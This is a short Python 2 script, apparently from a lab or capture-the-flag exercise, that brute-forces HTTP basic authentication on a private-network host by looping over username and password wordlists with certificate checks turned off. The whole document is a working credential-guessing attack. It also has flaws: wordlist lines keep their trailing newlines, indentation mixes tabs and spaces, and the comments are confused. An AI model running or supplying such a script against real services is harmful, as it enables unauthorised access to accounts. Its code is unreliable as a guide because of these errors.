#!/usr/bin/env python
import sys
import requests
#the 2 following import is for https, comment for http brute-force
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

with open('usernames') as f1:
	for line1 in f1:
		with open('passwords') as f2:
			for line2 in f2:
				print "testing "+line1+":"+ line2
				r = requests.get('https://192.168.130.184:1337/', auth=(line1, line2), verify=False)
				#without http, run the below uncomment the below code instead of the above one
				#r = requests.get('https://192.168.130.184:1337/', auth=(line1, line2))
                                if r.status_code == 200:
					print "Found valid credentials \"" + line1 + ":" + line2 + "\""
					raise sys.exit()
